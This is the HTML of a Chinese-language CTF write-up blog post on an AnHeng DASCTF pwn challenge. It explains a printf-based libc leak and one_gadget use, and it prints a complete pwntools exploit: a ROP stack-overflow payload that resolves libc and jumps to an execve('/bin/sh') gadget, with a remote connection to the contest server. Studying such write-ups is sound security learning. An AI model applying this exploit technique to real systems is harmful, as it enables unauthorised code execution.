@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="题目链接🔗  👴学到了什么？  printf 泄漏真实地址的参数使用，以及地址接收的处理 one_gadget 神器的了解。这题不知道为啥在 libc 中找的 system 执行会报错 当符号表被删除时（stripped），返回函数就不能用 elf.plt 了 当栈溢出执行了一些操作后，会影响到本身的函数这题也就是 4006D2，所以返回地址直接写程序的头部     因为我自己还是不能很好的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒月赛 DASCTF wp">
+<meta property="og:url" content="http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="题目链接🔗  👴学到了什么？  printf 泄漏真实地址的参数使用，以及地址接收的处理 one_gadget 神器的了解。这题不知道为啥在 libc 中找的 system 执行会报错 当符号表被删除时（stripped），返回函数就不能用 elf.plt 了 当栈溢出执行了一些操作后，会影响到本身的函数这题也就是 4006D2，所以返回地址直接写程序的头部     因为我自己还是不能很好的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013000.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013016.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013028.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013045.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013101.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013113.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013140.png">
+<meta property="article:published_time" content="2020-04-26T15:27:20.000Z">
+<meta property="article:modified_time" content="2021-02-16T17:31:51.140Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013000.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>安恒月赛 DASCTF wp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/27/PWN-study-0x03/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/25/PWN%EF%BD%9C%E9%86%8D%E9%86%90%E7%81%8C%E9%A1%B6%E4%B9%8B%E6%A0%88%E7%9A%84%E7%90%86%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&text=安恒月赛 DASCTF wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&is_video=false&description=安恒月赛 DASCTF wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒月赛 DASCTF wp&body=Check out this article: http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&name=安恒月赛 DASCTF wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&t=安恒月赛 DASCTF wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#one-gadget-%E7%A5%9E%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">one_gadget 神器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#printf-%E4%BC%A0%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">printf 传参数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        安恒月赛 DASCTF wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-26T15:27:20.000Z" itemprop="datePublished">2020-04-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ybm911/Blog_Document/tree/master/pwn/DASCTF%20echo%20server">题目链接🔗</a></p>
+</blockquote>
+<p>👴学到了什么？</p>
+<ul>
+<li>printf 泄漏真实地址的参数使用，以及地址接收的处理</li>
+<li>one_gadget 神器的了解。这题不知道为啥在 libc 中找的 system 执行会报错</li>
+<li>当符号表被删除时（stripped），返回函数就不能用 elf.plt 了</li>
+<li>当栈溢出执行了一些操作后，会影响到本身的函数这题也就是 4006D2，所以返回地址直接写程序的头部</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013000.png" alt="public"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013016.png" alt="liaotian1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013028.png" alt="liaotian2"></p>
+<p>因为我自己还是不能很好的理解，所以就把师傅们的原话挂出来了，🙏感谢</p>
+<blockquote>
+<p>补充：后面和 publicQi 师傅研究了一下，不是 rbp 被打乱了，是直接返回到 4006D2 后，printf 函数执行出现错误</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013045.png" alt="4006D2"></p>
+<p>就是4006D2这个函数，不能通过 elf.symbols[‘sub_4006D2’] 返回。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013101.png" alt="4006d"></p>
+<p>也不能填 0x4006D2 地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013113.png" alt="4006d3"></p>
+<p>要填写 0x4005c0 地址，如果出现一些意外就考虑返回到 start_addr，start 才是真正程序重新开始的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013126.png" alt="rop"></p>
+<h4 id="one-gadget-神器"><a href="#one-gadget-神器" class="headerlink" title="one_gadget 神器"></a>one_gadget 神器</h4><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so<br><a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">官方文档点击此处</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@e703366904de:&#x2F;pwn# one_gadget libc.so.6</span><br><span class="line">0x4f2c5 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br></pre></td></tr></table></figure>
+<p>通过使用one_gadget可以找到获得shell的函数的地址<br><code>execve_addr = 0x4f2c5</code></p>
+<h4 id="printf-传参数"><a href="#printf-传参数" class="headerlink" title="printf 传参数"></a>printf 传参数</h4><p>printf(‘%s’,elf.got[‘read’]);</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013140.png" alt="s"></p>
+<p><code>payload = 136*&#39;a&#39; + p64(rdi) + p64(0x400875) + p64(rsi_r15) +p64(read_got) + &quot;a&quot;*8 + p64(printf_elf) + p64(sub)</code><br>sub 就是上面说的返回地址</p>
+<p>exp ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">BIN = <span class="string">&#x27;./test&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;183.129.189.60&#x27;</span></span><br><span class="line">PORT = <span class="number">10061</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sh</span>):</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">    libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    libc_bin = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">    libc_read = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    <span class="comment">#Eli0t</span></span><br><span class="line">    rdi = <span class="number">0x400823</span></span><br><span class="line">    rsi_r15 = <span class="number">0x400821</span></span><br><span class="line">    read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    printf_elf = elf.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    <span class="comment">#sub = 0x4006d2</span></span><br><span class="line">    sub = <span class="number">0x4005c0</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;300&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">    payload = <span class="number">136</span>*<span class="string">&#x27;a&#x27;</span> + p64(rdi) + p64(<span class="number">0x400875</span>) + p64(rsi_r15) +p64(read_got) + <span class="string">&quot;a&quot;</span>*<span class="number">8</span> + p64(printf_elf) + p64(sub)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="comment">#read_true = u64(sh.recv(8))</span></span><br><span class="line">    read_true =u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(read_true)</span><br><span class="line">    libcc = read_true - libc_read</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;300&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">    payload_2 = <span class="number">136</span>*<span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x4f2c5</span> + libcc)</span><br><span class="line">    sh.sendline(payload_2.ljust(<span class="number">300</span>,<span class="string">&quot;\xcc&quot;</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    elf = ELF(BIN)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        LOCAL = <span class="literal">False</span></span><br><span class="line">        sh = remote(HOST,PORT)</span><br><span class="line">        exploit(sh)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="literal">True</span></span><br><span class="line">        sh = process(BIN)</span><br><span class="line">        log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">        <span class="comment"># pause</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">        exploit(sh)</span><br></pre></td></tr></table></figure>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://n0vice.top/2019/12/12/BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/#more">https://n0vice.top/2019/12/12/BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/#more</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#one-gadget-%E7%A5%9E%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">one_gadget 神器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#printf-%E4%BC%A0%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">printf 传参数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&text=安恒月赛 DASCTF wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&is_video=false&description=安恒月赛 DASCTF wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒月赛 DASCTF wp&body=Check out this article: http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&title=安恒月赛 DASCTF wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&name=安恒月赛 DASCTF wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/04/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF-wp/&t=安恒月赛 DASCTF wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
